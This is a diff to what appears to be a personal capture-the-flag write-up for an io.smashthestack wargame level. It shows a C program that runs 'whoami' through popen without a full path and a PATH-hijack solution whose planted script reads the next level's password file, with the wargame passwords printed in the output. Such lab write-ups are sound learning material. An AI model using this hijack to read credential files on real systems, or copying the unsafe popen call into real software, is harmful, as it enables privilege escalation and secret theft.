@@ -140,9 +140,40 @@ This is exciting we're going to 0x8048474 Win.
 sh-4.2$ cat /home/level4/.pass
 nSwmULj2LpDnRGU2
 ```
+
 ##Level04
 
 ___
+The program:
+
+```c
+//writen by bla
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+        char username[1024];
+        FILE* f = popen("whoami","r");
+        fgets(username, sizeof(username), f);
+        printf("Welcome %s", username);
+
+        return 0;
+}
+
+```
+
+I'll didn't know how to solve it at all really, guess when I meet a similar problem in the future the PATH will be more accessible in my head :)
+There's a good writeup here: [http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/](http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/)
+
+```bash
+level4@io:/tmp/fisk$ echo "cat /home/level5/.pass" >> whoami
+level4@io:/tmp/fisk$ chmod 777 whoami
+level4@io:/tmp/fisk$ PATH="/tmp/fisk:$PATH"
+level4@io:/tmp/fisk$ echo $PATH
+/tmp/fisk:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+level4@io:/tmp/fisk$ /levels/level04
+Welcome LOoCy5PbKi63qXTh
+```
 
 
 ##Level05
